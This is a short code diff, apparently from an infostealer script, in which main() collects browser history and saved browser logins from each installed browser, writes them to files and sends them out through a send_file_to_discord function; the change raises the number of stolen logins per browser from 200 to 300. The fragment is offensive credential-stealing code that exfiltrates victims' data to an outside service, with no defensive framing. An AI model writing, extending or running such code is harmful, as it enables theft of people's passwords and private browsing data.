@@ -319,7 +319,7 @@ def main():
             send_file_to_discord(file_path, message="Browser History")
 
     for browser in installed_browsers:
-        logins = get_browser_logins(browser, limit=200)
+        logins = get_browser_logins(browser, limit=300)
         if logins:
             file_path = save_to_file(f"{browser}_logins", logins)
             created_files.append(file_path)
